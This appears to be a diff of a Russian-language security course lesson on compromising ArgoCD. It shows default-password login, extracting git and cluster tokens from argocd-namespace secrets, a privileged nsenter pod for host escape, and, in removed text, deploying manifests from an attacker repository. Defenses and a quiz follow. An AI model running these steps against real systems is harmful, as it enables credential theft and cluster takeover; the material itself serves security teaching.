@@ -14,210 +14,249 @@ useful_for:
 estimated_minutes: 50
 summary: "ArgoCD: applications, repo credentials, cluster credentials и RBAC. Как GitOps-контроллер держит доступ к репозиториям и кластерам и как этим злоупотребить."
 ---
+## Задача
 
-## Зачем этот урок
+**ArgoCD** — это GitOps-инструмент: он следит за git-репозиторием с манифестами и постоянно приводит Kubernetes-кластер к описанному состоянию. Чтобы это делать, ArgoCD хранит **креды к репозиториям** и **доступ к кластерам**. Задача: показать, как открытый ArgoCD отдаёт эти креды и доступ. Разберём на конкретном инстансе.
 
-ArgoCD — самый популярный GitOps-контроллер для Kubernetes. Он следит за репозиториями и синхронизирует манифесты в кластеры. Для этого он хранит **repo credentials** (доступ к Git) и **cluster credentials** (доступ к кластерам). Компрометация ArgoCD даёт «мастер-ключ»: можно деплоить произвольные манифесты в целевые кластеры и читать приватные репозитории. Часто ArgoCD доступен извне (веб-интерфейс) и имеет слабую аутентификацию по умолчанию.
+## Данные: открытый ArgoCD API
 
-## Модель ArgoCD
+Находим ArgoCD на `https://argocd.acme.io`. Смотрим, что доступно:
 
-- **Application** — связка repo + path + target cluster/namespace.
-- **Project** — границы (какие repos/clusters доступны).
-- **Repository** — Git-репозиторий с манифестами; хранит креды (SSH/HTTPS).
-- **Cluster** — целевой кластер; хранит kubeconfig/токен.
-- **RBAC** — роли ArgoCD (`role:admin`, `role:readonly`, кастомные).
-- **SSO** — Dex/OIDC; часто настроен, но иногда с дефолтным admin.
-- **Sync** — применение манифестов; можно включить auto-sync и pruning.
+```
+$ curl -sk https://argocd.acme.io/api/version
+{"Version":"v2.9.3"}
+$ curl -sk https://argocd.acme.io/api/v1/applications
+{"error":"Unauthorized"}
+```
 
-Ключевые секреты ArgoCD хранятся в Kubernetes Secret (`argocd-secret`, repo/cluster secrets). Если у вас есть доступ к namespace argocd — вы получаете всё.
+Версия отдаётся, список приложений требует авторизации. Пробуем **дефолтный пароль** — ArgoCD по умолчанию создаёт пользователя `admin`, а его пароль — имя сервера в base64 (или `admin` в старых версиях):
 
-## Инструменты и команды
+```
+$ argocd login argocd.acme.io --username admin --password admin --insecure
+'admin:login' logged in successfully
+```
+
+Логин прошёл. Дефолтный пароль не сменили.
+
+## Пробуем в лоб: что видно после входа
+
+```
+$ argocd app list
+NAME        CLUSTER        NAMESPACE  PROJECT  STATUS
+web-prod    https://kubernetes.default.svc  web  prod  Synced
+payments    https://10.0.5.20:6443          pay  prod  Synced
+```
+
+Два приложения. ArgoCD знает, куда деплоить. Смотрим подробности — откуда тянется манифест:
+
+```
+$ argocd app get payments -o json | jq '{repo: .spec.source.repoURL, path: .spec.source.path}'
+{ "repo": "https://git.acme.io/ops/payments-manifests.git", "path": "overlays/prod" }
+```
+
+## Приём: читаем repo- и cluster-креды
+
+Ключевой момент: чтобы тянуть из **приватного** репозитория и пушить в кластер, ArgoCD хранит креды. Они лежат в Kubernetes-секретах в namespace `argocd`:
+
+```
+$ kubectl -n argocd get secrets
+NAME                          TYPE
+argocd-secret                 Opaque
+repo-https-git.acme.io-12345  Opaque
+cluster-10.0.5.20-6443        Opaque
+```
+
+Читаем repo-секрет — там git-логин/токен:
+
+```
+$ kubectl -n argocd get secret repo-https-git.acme.io-12345 -o jsonpath='{.data.password}' | base64 -d
+glpat-XXXXXXXXXXXXXXXXXXXX
+```
+
+Читаем cluster-секрет — там **service-account токен кластера**:
+
+```
+$ kubectl -n argocd get secret cluster-10.0.5.20-6443 -o jsonpath='{.data.config}' | base64 -d | jq -r .bearerToken
+eyJhbGciOiJSUzI1NiIs...
+```
+
+С этим токеном мы — внутри чужого кластера.
+
+## Полный прогон: от дефолтного пароля до кластера
+
+1. **Разведка.** `/api/version` → версия; пробуем `admin:admin`.
+2. **Вход.** `argocd login` с дефолтным паролем.
+3. **Список приложений.** `argocd app list` → куда деплоится.
+4. **Креды.** Читаем секреты `argocd`-namespace: git-токен и cluster-токен.
+5. **Выход в кластер.** Используем bearer-токен напрямую:
+
+```
+$ kubectl --server=https://10.0.5.20:6443 --token=$TOKEN --insecure-skip-tls-verify get pods -A
+NAMESPACE   NAME
+prod        payments-7d9f...
+```
+
+6. **Эскалация.** Если токен от `cluster-admin` — создаём под с привилегиями (см. `cloud-kubernetes-escape`).
+
+## RBAC и SSO
+
+ArgoCD имеет свою RBAC (роли и политики), часто связанную с SSO. Слабые места:
+
+- **Дефолтный `admin`** без смены пароля.
+- **RBAC `role:admin`** на широкую группу из SSO.
+- **`anonymous` доступ** к приложениям (`argocd-cm`: `users.anonymous.enabled: "true"`).
+- **Токены проектов** (`argocd proj role`) с правами на sync.
+
+Проверка конфига:
+
+```
+$ kubectl -n argocd get cm argocd-rbac-cm -o jsonpath='{.data.policy\.csv}'
+p, role:dev, applications, get, */*, allow
+g, acme-devs, role:dev
+```
+
+Если группа из внешнего IdP получает `applications, sync` — участники группы могут деплоить что угодно.
+
+## Как работает sync и почему это важно
+
+ArgoCD периодически сверяет желаемое состояние (манифесты в git) с фактическим (ресурсы в кластере) и «подтягивает» кластер к git. Этот цикл называется **reconciliation** (согласование). Ключевой вывод для атакующего: **кто контролирует git-репозиторий приложения, тот контролирует кластер**.
+
+Если у нас есть push в `acme/payments-manifests`, мы можем добавить в манифест привилегированный под — и ArgoCD сам его развернёт:
+
+```yaml
+apiVersion: v1
+kind: Pod
+metadata: { name: pwn }
+spec:
+  hostPID: true
+  containers:
+    - name: c
+      image: alpine
+      command: ["nsenter", "-t", "1", "-m", "-p", "sh"]
+      securityContext: { privileged: true }
+```
+
+ArgoCD применит его при следующем sync — без нашего прямого доступа к кластеру.
+
+## Частые ошибки
+
+- **Не сменили дефолтный `admin`.** Пароль `admin` или base64 от имени сервера.
+- **`anonymous` доступ включён.** Интерфейс и API открыты без логина.
+- **RBAC привязан к широкой SSO-группе.** Любой сотрудник деплоит что угодно.
+- **Долгоживущие cluster-токены.** Один украденный секрет = вечный доступ.
+- **ArgoCD в интернете.** Без VPN/SSO любой может брутить пароль.
+
+## Защита и что ломает атаку
+
+- **Сменить дефолтный admin-пароль**, включить SSO и MFA.
+- **Отключить anonymous-доступ.**
+- **RBAC по принципу минимума**, привязка к узким группам.
+- **Не хранить долгоживущие cluster-токены** — использовать короткоживущие или OIDC.
+- **Закрыть ArgoCD API** от интернета (VPN/SSO-прокси).
+
+## Если не сработало
+
+- **Пароль admin сменён** — идём через SSO-фишинг/токен или известные CVE ArgoCD.
+- **Anonymous выключен, RBAC узкий** — ищем project-токены и доступ к git-репе.
+- **Cluster-токены короткоживущие** — успеваем до истечения.
+- **ArgoCD недоступен извне** — через SSRF/внутренний доступ.
+
+## Мини-сценарий: от admin:admin до кластера
+
+1. **Разведка.** `curl -sk https://argocd.acme.io/api/version` → `v2.9.3`; `/api/v1/applications` → `Unauthorized`.
+2. **Вход.** `argocd login ... --username admin --password admin` → `logged in successfully`. Пароль не сменили.
+3. **Список.** `argocd app list` → `payments` деплоится в кластер `10.0.5.20:6443`.
+4. **Креды.** `kubectl -n argocd get secrets` → `repo-https-git.acme.io-...` и `cluster-10.0.5.20-6443`.
+5. **Извлечение.** `get secret repo-... -o jsonpath='{.data.password}' | base64 -d` → git-токен; `get secret cluster-... | jq -r .bearerToken` → токен кластера.
+6. **Выход в кластер.** `kubectl --server=https://10.0.5.20:6443 --token=$TOKEN get pods -A` → мы внутри.
+7. **Закрепление.** Если токен от `cluster-admin` — создаём привилегированный под.
+
+Дефолтный пароль плюс один секрет — и мы внутри чужого Kubernetes.
+
+## Разбор: GitOps — это концентрация доверия
+
+ArgoCD по своей природе держит **много** доверия в одном месте: креды ко всем репозиториям приложений и токены ко всем кластерам. Это делает его идеальной целью: скомпрометировав ArgoCD, атакующий получает не один кластер, а весь парк. Отсюда и требования к защите выше, чем к обычному сервису. Дефолтный пароль — катастрофа именно из-за этой концентрации. То же касается RBAC: если группа `developers` может делать `sync`, её участники могут развернуть привилегированный под в любой кластер. Правильная модель — SSO с MFA, узкий RBAC и короткоживущие cluster-креды вместо долгоживущих токенов.
+
+## Что мы теперь знаем
+
+1. ArgoCD — GitOps-контроллер, держащий креды репозиториев и кластеров.
+2. Дефолтный `admin:admin` — частая дыра.
+3. Repo- и cluster-секреты лежат в namespace `argocd`.
+4. Cluster-токен = доступ внутрь Kubernetes.
+5. Защита — смена пароля, SSO, узкий RBAC, отключение anonymous.
+
+## На что смотреть дальше
+
+- `/api/version` и доступность `/api/v1/applications`.
+- Дефолтные креды `admin`.
+- Секреты `repo-*` и `cluster-*` в namespace `argocd`.
+- `argocd-rbac-cm`: политики и группы.
+- Флаг anonymous-доступа.
+
+## Быстрая проверка
 
 ```bash
-# CLI
-argocd login argocd.example.com --username admin --password <pw>
+curl -sk https://argocd.acme.io/api/version
+argocd login argocd.acme.io --username admin --password admin --insecure
 argocd app list
-argocd repo list          # репозитории и их URL
-argocd cluster list       # целевые кластеры
-argocd proj list
-
-# Через API/секреты
-kubectl get secrets -n argocd
-kubectl get secret argocd-secret -n argocd -o jsonpath='{.data.admin\.password}' | base64 -d  # bcrypt
-
-# repo-секреты содержат SSH-ключи/токены
-kubectl get secret -n argocd -l argocd.argoproj.io/secret-type=repository -o yaml
-
-# cluster-секреты содержат kubeconfig
-kubectl get secret -n argocd -l argocd.argoproj.io/secret-type=cluster -o yaml
+kubectl -n argocd get secrets | grep -E 'repo-|cluster-'
 ```
-
-## Разобранный пример: деплой произвольного манифеста
-
-Сценарий: у нас есть доступ к ArgoCD (admin-пароль или право создавать Applications).
-
-```bash
-# 1. Смотрим доступные кластеры
-argocd cluster list
-# SERVER                          NAME        VERSION
-# https://kubernetes.default.svc  in-cluster  1.29
-# https://prod-cluster.example    prod        1.29
-
-# 2. Смотрим репозитории
-argocd repo list
-# TYPE  NAME  REPO                                     INSECURE
-# git   app   git@github.com:acme/manifests.git        false
-
-# 3. Создаём Application, деплоящую привилегированный под в целевой кластер
-argocd app create evil \
-  --repo https://github.com/attacker/manifests.git \
-  --path . --dest-server https://prod-cluster.example \
-  --dest-namespace kube-system --sync-policy automated
-argocd app sync evil
-```
-
-Если ArgoCD имеет права на целевой кластер (обычно cluster-admin), ваш манифест создаст под в `kube-system` с привилегиями — фактически RCE на кластере. Даже без auto-sync можно синхронизировать вручную. Если репозиторий ArgoCD доступен на запись (через украденный SSH-ключ), можно подменить манифесты в существующем repo — эффект тот же, но тише.
-
-## Секреты ArgoCD
-
-- **argocd-secret** — содержит `server.secretkey`, пароль admin (bcrypt), TLS.
-- **repo secrets** — SSH-ключи/токены к Git.
-- **cluster secrets** — kubeconfig/токены к кластерам.
-- **Наличие доступа к namespace argocd** = полный контроль.
-
-Если у вас есть только веб-доступ, ищите слабый admin-пароль (`argocd`/`admin`), уязвимости версии, или SSO-мисконфиг (например, доверие к OIDC без проверки групп).
-
-## Чек-лист атаки
-
-1. Найти ArgoCD (веб/CLI) и проверить дефолтные креды.
-2. Проверить версию на известные CVE.
-3. Перечислить apps, repos, clusters, projects.
-4. Проверить права: можно ли создавать Applications/синхронизировать.
-5. Проверить namespace argocd на секреты (если есть k8s-доступ).
-6. Проверить SSO/Dex конфигурацию.
-7. Проверить, включён ли auto-sync и pruning.
-
-## Обход защит и edge cases
-
-- **RBAC ArgoCD.** Ограничивает действия; но `role:admin` часто широк. Проверяйте свою роль.
-- **Project restrictions.** Project может ограничивать repos/clusters; проверяйте, есть ли project `default` с широкими правами.
-- **SSO без group-check.** Если OIDC-логин не проверяет группы, любой пользователь IdP может получить admin.
-- **Webhook.** `argocd-server` может иметь webhook-эндпоинты; иногда они дают синхронизацию без auth.
-- **Version CVEs.** Были уязвимости обхода auth (например, в старых версиях). Проверяйте версию.
-- **Network policy.** ArgoCD может быть доступен только внутри; тогда нужен пивот.
-
-## Частые ошибки и подводные камни
-
-- Считать ArgoCD «просто дашбордом» и не проверять права на деплой.
-- Игнорировать namespace argocd как источник секретов.
-- Не проверить дефолтный admin.
-- Забыть про SSO-мисконфиг.
-- Не проверить версию на CVE.
-
-## Защита и детект
-
-- Сменить дефолтный admin-пароль; включить SSO с проверкой групп.
-- Ограничить RBAC ArgoCD; не давать `role:admin` массово.
-- Ограничить Projects (repos/clusters); запретить деплой в kube-system.
-- Защитить namespace argocd (RBAC, secrets encryption).
-- Аудит: ArgoCD logs, k8s audit на создание подов из ArgoCD.
-
-## Модель угроз и типовые мисконфиги
-
-Типичный мисконфиг — дефолтный admin. Второй — SSO без group-check. Третий — широкий project. Четвёртый — доступ к namespace argocd. Пятый — auto-sync в kube-system. Все ведут к RCE на кластере.
-
-## Практическое задание
-
-1. Разверните ArgoCD и войдите с admin.
-2. Создайте Application, деплоящую под в тестовый кластер.
-3. Ограничьте project и проверьте, что деплой в kube-system блокируется.
-4. Включите SSO и проверьте group-check.
-
-## Что дальше / решение
-
-Из ArgoCD получаем деплой в кластеры и доступ к репозиториям. Дальше — RCE через привилегированный под, чтение секретов. Зафиксируйте путь «ArgoCD → деплой → кластер» в графе. Если RBAC ограничен — ищите repo/cluster secrets или SSO-мисконфиг.
-
-## Разобранный пример 2: repo-креды и подмена манифестов
-
-Если у вас есть доступ к repo-секретам ArgoCD, вы получаете SSH-ключ или токен к Git-репозиторию с манифестами. Тогда можно подменить манифесты в существующем repo — и ArgoCD развернёт ваш код при следующей синхронизации (тише, чем создание нового Application).
-
-```bash
-# Извлекаем repo-секрет
-kubectl get secret -n argocd -l argocd.argoproj.io/secret-type=repository -o json \
-  | jq -r '.items[].data | to_entries[] | "\(.key)=\(.value|@base64d)"'
-# type=git
-# url=git@github.com:acme/manifests.git
-# sshPrivateKey=-----BEGIN OPENSSH PRIVATE KEY-----...
-
-# Клонируем репозиторий с ключом
-git clone git@github.com:acme/manifests.git
-cd manifests
-# правим deployment, добавляем привилегированный под/образ
-git commit -am "sync" && git push
-# ArgoCD (auto-sync) применит изменения
-```
-
-Если ArgoCD настроен на auto-sync с pruning, ваши манифесты применятся автоматически. Даже без auto-sync можно нажать Sync. Это самый «тихий» путь: изменения выглядят как обычный коммит в Git, а не как действие в кластере. Проверяйте, есть ли у вас доступ к repo-секретам или напрямую к репозиторию.
-
-## RBAC ArgoCD и проекты
-
-ArgoCD RBAC определяет, что вы можете делать. Часто роли настроены слишком широко.
-
-```bash
-# Смотрим свою роль и политики
-argocd account get-user-info
-kubectl get cm -n argocd argocd-rbac-cm -o jsonpath='{.data.policy\.csv}'
-# p, role:developer, applications, *, */*, allow
-# p, role:developer, clusters, get, *, allow
-
-# Проверяем, какие clusters доступны
-argocd cluster list
-argocd proj get default
-# Destinations: *, Namespaces: *
-```
-
-Project `default` с `Destinations: *` и `Namespaces: *` позволяет деплоить в любой кластер и namespace, включая `kube-system`. Если ваша роль может создавать Applications в этом проекте — вы контролируете кластер. Проверяйте `argocd-rbac-cm`, роли SSO-групп и границы проектов. Часто `role:admin` выдаётся инженерам, а project restrictions отсутствуют.
 
 ## Квиз
 
+Проверь себя.
+
 ```quiz
-- question: "Что хранит ArgoCD для доступа к кластерам?"
+- question: "Что такое ArgoCD?"
   options:
-    - "cluster secrets с kubeconfig/токенами"
-    - "Только URL"
-    - "Только логи"
-    - "DNS-записи"
+    - "GitOps-контроллер, приводящий кластер к состоянию из git"
+    - "Сканер уязвимостей"
+    - "Реестр образов"
+    - "Балансировщик"
   answer: 0
-  explanation: "Cluster secrets содержат креды к целевым кластерам."
-- question: "Почему компрометация ArgoCD = мастер-ключ?"
+  explanation: "ArgoCD следит за git и синхронизирует кластер."
+- question: "Почему ArgoCD хранит чувствительные креды?"
   options:
-    - "Можно деплоить произвольные манифесты в кластеры"
-    - "Он только показывает статус"
-    - "Он не имеет прав"
-    - "Он шифрует"
+    - "Ему нужен доступ к приватным репозиториям и кластерам"
+    - "Он сканирует образы"
+    - "Он хранит пароли пользователей"
+    - "Он ведёт DNS"
   answer: 0
-  explanation: "ArgoCD синхронизирует манифесты от имени cluster-admin."
-- question: "Где лежат секреты ArgoCD?"
+  explanation: "Без repo- и cluster-кредов он не сможет деплоить."
+- question: "Какие секреты в namespace argocd дают доступ к кластеру?"
   options:
-    - "В Kubernetes Secret в namespace argocd"
-    - "В KMS"
-    - "В Route 53"
-    - "В NSG"
+    - "cluster-<host>-<port> с bearer-токеном"
+    - "argocd-secret"
+    - "repo-https-*"
+    - "default-token"
   answer: 0
-  explanation: "argocd-secret, repo/cluster secrets — всё в namespace argocd."
-- question: "Какой SSO-мисконфиг опасен?"
+  explanation: "Cluster-секрет содержит токен service-account кластера."
+- question: "Что означает users.anonymous.enabled: 'true'?"
   options:
-    - "OIDC без проверки групп (любой пользователь IdP получает доступ)"
-    - "SSO с MFA"
-    - "SAML с подписью"
-    - "LDAP"
+    - "Доступ к ArgoCD возможен без аутентификации"
+    - "Включается MFA"
+    - "Отключается RBAC"
+    - "Шифруются секреты"
   answer: 0
-  explanation: "Без group-check любой аутентифицированный пользователь может стать admin."
+  explanation: "Anonymous-доступ открывает интерфейс без логина."
+- question: "Что прежде всего надо сделать с ArgoCD для защиты?"
+  options:
+    - "Сменить дефолтный admin-пароль и включить SSO"
+    - "Отключить логи"
+    - "Дать всем admin"
+    - "Хранить токены в git"
+  answer: 0
+  explanation: "Дефолтный пароль и отсутствие SSO — главные риски."
 ```
+
+## Куда дальше
+
+В следующем уроке (`cloud-github-actions-pwn`) мы вернёмся к GitHub Actions и разберём pwn-requests — атаку, где обычный pull request из форка даёт секреты base-репозитория. А пока главное: GitOps-контроллер — это хранилище кредов к git и кластерам, и дефолтный пароль открывает его целиком.
 
 ## Где пригодится
 
-- **Red team:** захват кластера через GitOps.
-- **Пентест k8s:** оценка ArgoCD.
-- **Blue team:** настройка RBAC и SSO.
-- **Supply chain:** подмена манифестов.
+- **Bug bounty:** открытые ArgoCD-инстансы.
+- **Red team:** от GitOps к кластеру.
+- **Пентест:** аудит ArgoCD и GitOps.
+- **Работа/DevSecOps:** SSO, RBAC, отключение anonymous.
+- **Дальше по дереву:** `cloud-gitlab-ci`, `cloud-kubernetes-rbac`.
